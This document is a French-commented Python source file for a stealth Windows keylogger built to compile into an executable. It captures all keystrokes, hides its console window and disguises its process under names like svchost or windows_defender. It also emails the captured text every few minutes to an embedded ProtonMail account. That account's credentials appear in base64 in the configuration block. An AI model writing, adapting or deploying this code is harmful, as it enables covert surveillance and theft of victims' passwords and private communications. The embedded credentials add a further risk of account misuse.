#!/usr/bin/env python3
# keylogger_exe.py - Version pour compilation .exe avec PyInstaller
# Tout intégré : config, identifiants, chiffrement

import sys
import os
import smtplib
import threading
import time
import random
import base64
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput.keyboard import Listener, Key

# ================= CONFIGURATION EMBARQUÉE =================
# Les identifiants sont en BASE64 dans le code pour éviter le plain text
CONFIG = {
    # EMAIL CONFIG (en base64 - à encoder avec encode_config.py)
    'EMAIL_TO': 'ZXVzdGlzLWJlcnJ1QHByb3Rvbi5tZQ==',  # ****@proton.me en base64
    'EMAIL_FROM': 'ZXVzdGlzLWJlcnJ1QHByb3Rvbi5tZQ==',
    'SMTP_SERVER': 'c210cC5wcm90b25tYWlsLmNo',  # smtp.protonmail.ch
    'SMTP_PORT': 'NTg3',  # 587
    'USE_TLS': True,
    
    # IDENTIFIANTS (à encoder séparément)
    'EMAIL_USER': 'ZXVzdGlzLWJlcnJ1QHByb3Rvbi5tZQ==',
    'EMAIL_PASSWORD': 'Y2Y1NkR5cjhxMldyNHVUeQ==',  # Ton mot de passe en base64
    
    # PARAMÈTRES
    'SEND_INTERVAL_MIN': 180,  # 3 minutes
    'SEND_INTERVAL_MAX': 300,  # 5 minutes
    'MIN_CHARS_TO_SEND': 30,
    'STOP_KEYWORD': 'STOPLOG',
    
    # OPTIONS
    'ENCRYPT_LOGS': False,
    'RANDOM_FILENAME': True,  # Génère un nom aléatoire pour le .exe
}

# ================= UTILS =================
def decode_config(config):
    """Décode la configuration base64"""
    decoded = {}
    for key, value in config.items():
        if isinstance(value, str) and key not in ['USE_TLS', 'ENCRYPT_LOGS', 'RANDOM_FILENAME']:
            try:
                decoded[key] = base64.b64decode(value).decode('utf-8')
            except:
                decoded[key] = value  # Garde la valeur si pas en base64
        else:
            decoded[key] = value
    
    # Convertir le port en int
    if 'SMTP_PORT' in decoded and isinstance(decoded['SMTP_PORT'], str):
        try:
            decoded['SMTP_PORT'] = int(decoded['SMTP_PORT'])
        except:
            decoded['SMTP_PORT'] = 587
    
    return decoded

def get_random_filename():
    """Génère un nom aléatoire pour le processus"""
    if CONFIG.get('RANDOM_FILENAME', True):
        names = [
            'svchost', 'winupdate', 'system32', 'runtime',
            'javaw', 'chrome_helper', 'adobe_update',
            'nvidia_driver', 'intel_service', 'windows_defender'
        ]
        return f"{random.choice(names)}{random.randint(10,99)}.exe"
    return "keylogger.exe"

# ================= KEYLOGGER =================
class StealthKeyLogger:
    def __init__(self):
        self.config = decode_config(CONFIG)
        self.buffer = ""
        self.is_running = True
        self.process_name = get_random_filename()
        self.setup_stealth()
        
        # Intervalle aléatoire
        self.next_send_interval = random.randint(
            self.config['SEND_INTERVAL_MIN'],
            self.config['SEND_INTERVAL_MAX']
        )
    
    def setup_stealth(self):
        """Configure le mode furtif"""
        # Changer le nom du processus dans le task manager
        try:
            import ctypes
            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
            kernel32.SetConsoleTitleW(f"{self.process_name}")
        except:
            pass
        
        # Cacher la fenêtre console
        try:
            import win32console
            import win32gui
            window = win32console.GetConsoleWindow()
            win32gui.ShowWindow(window, 0)  # 0 = SW_HIDE
        except:
            pass
    
    def format_key(self, key):
        """Formate une touche pour affichage lisible"""
        try:
            if hasattr(key, 'char') and key.char:
                return key.char
        except AttributeError:
            pass
        
        special_keys = {
            Key.space: ' ',
            Key.enter: '\n',
            Key.tab: '\t',
            Key.backspace: '⌫',
            Key.esc: '⎋',
            Key.shift: '⇧',
            Key.ctrl_l: '⌃', Key.ctrl_r: '⌃',
            Key.alt_l: '⌥', Key.alt_r: '⌥',
            Key.cmd: '❖',
            Key.caps_lock: '⇪',
        }
        
        if key in special_keys:
            return special_keys[key]
        
        key_name = str(key).replace('Key.', '')
        return f'[{key_name}]'
    
    def obfuscate_content(self, content):
        """Obfusque légèrement le contenu (optionnel)"""
        # Simple XOR pour rendre le texte illisible en plain text
        key = 0x55
        obfuscated = []
        for char in content:
            obfuscated.append(chr(ord(char) ^ key))
        return ''.join(obfuscated)
    
    def send_email_report(self):
        """Envoie les logs par email"""
        if len(self.buffer) < self.config['MIN_CHARS_TO_SEND']:
            return False
        
        try:
            # Préparer le contenu
            logs = self.buffer
            if self.config.get('ENCRYPT_LOGS', False):
                logs = self.obfuscate_content(logs)
            
            # Préparer l'email
            msg = MIMEMultipart()
            msg['From'] = self.config['EMAIL_FROM']
            msg['To'] = self.config['EMAIL_TO']
            
            # Sujet avec date mais pas d'indice
            date_str = datetime.now().strftime('%m%d%H%M')
            msg['Subject'] = f"Report {date_str}"
            
            # Corps
            body = f"""System activity report
Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Chars captured: {len(self.buffer)}
Process: {self.process_name}

--- Start Log ---
{logs}
--- End Log ---

Auto-generated report
"""
            
            msg.attach(MIMEText(body, 'plain', 'utf-8'))
            
            # Envoi
            with smtplib.SMTP(self.config['SMTP_SERVER'], self.config['SMTP_PORT']) as server:
                if self.config['USE_TLS']:
                    server.starttls()
                
                server.login(
                    self.config['EMAIL_USER'],
                    self.config['EMAIL_PASSWORD']
                )
                
                server.send_message(msg)
            
            print(f"[+] Report sent ({len(self.buffer)} chars)")
            self.buffer = ""
            
            # Nouvel intervalle aléatoire
            self.next_send_interval = random.randint(
                self.config['SEND_INTERVAL_MIN'],
                self.config['SEND_INTERVAL_MAX']
            )
            
            return True
            
        except Exception as e:
            # Erreur silencieuse
            return False
    
    def email_sender_daemon(self):
        """Thread d'envoi"""
        while self.is_running:
            time.sleep(self.next_send_interval)
            self.send_email_report()
    
    def on_press(self, key):
        """Callback pour les frappes"""
        formatted_key = self.format_key(key)
        self.buffer += formatted_key
        
        # Détection STOPLOG
        if self.config['STOP_KEYWORD'] in self.buffer:
            self.send_email_report()
            self.is_running = False
            return False
    
    def on_release(self, key):
        if key == Key.esc:
            self.send_email_report()
            self.is_running = False
            return False
    
    def run(self):
        """Lancement silencieux"""
        # Thread email
        email_thread = threading.Thread(target=self.email_sender_daemon, daemon=True)
        email_thread.start()
        
        # Keylogger
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

# ================= SCRIPT D'ENCODAGE =================
def create_encode_script():
    """Crée un script pour encoder ta config"""
    encode_script = '''#!/usr/bin/env python3
# encode_config.py - Encode ta configuration pour le keylogger

import base64
import json
import getpass

print("Encodeur de configuration pour keylogger.exe")
print("=" * 50)

# Récupère les infos
email = input("Email: ")
password = getpass.getpass("Mot de passe SMTP: ")
smtp = input("Serveur SMTP (ex: smtp.protonmail.ch): ")
port = input("Port SMTP (587): ") or "587"

# Encode en base64
config = {
    "EMAIL_TO": base64.b64encode(email.encode()).decode(),
    "EMAIL_FROM": base64.b64encode(email.encode()).decode(),
    "SMTP_SERVER": base64.b64encode(smtp.encode()).decode(),
    "SMTP_PORT": base64.b64encode(port.encode()).decode(),
    "EMAIL_USER": base64.b64encode(email.encode()).decode(),
    "EMAIL_PASSWORD": base64.b64encode(password.encode()).decode(),
}

print("\\n✅ Configuration encodée:")
print("=" * 50)
for key, value in config.items():
    print(f"'{key}': '{value}',")
print("=" * 50)
print("\\nCopie-colle ces lignes dans ton script Python!")

# Option: Sauvegarder dans un fichier
save = input("\\nSauvegarder dans config_encoded.txt? (o/n): ")
if save.lower() == 'o':
    with open('config_encoded.txt', 'w') as f:
        json.dump(config, f, indent=2)
    print("✅ Config sauvegardée dans config_encoded.txt")
'''
    
    with open('encode_config.py', 'w', encoding='utf-8') as f:
        f.write(encode_script)
    
    print("Script encode_config.py créé!")
    print("Exécute-le pour encoder ta configuration.")

# ================= MAIN =================
if __name__ == "__main__":
    # Si premier lancement sans config, créer le script d'encodage
    if CONFIG['EMAIL_TO'] == 'ZXVzdGlzLWJlcnJ1QHByb3Rvbi5tZQ==':
        print("⚠️  CONFIGURATION PAR DÉFAUT DÉTECTÉE")
        print("Tu dois encoder TES identifiants!")
        
        create = input("Créer le script d'encodage? (o/n): ")
        if create.lower() == 'o':
            create_encode_script()
            input("\nAppuyez sur Entrée pour quitter...")
            sys.exit(0)
    
    # Lancer le keylogger
    print("Démarrage en mode furtif...")
    
    try:
        logger = StealthKeyLogger()
        logger.run()
    except Exception as e:
        # Erreur silencieuse
        pass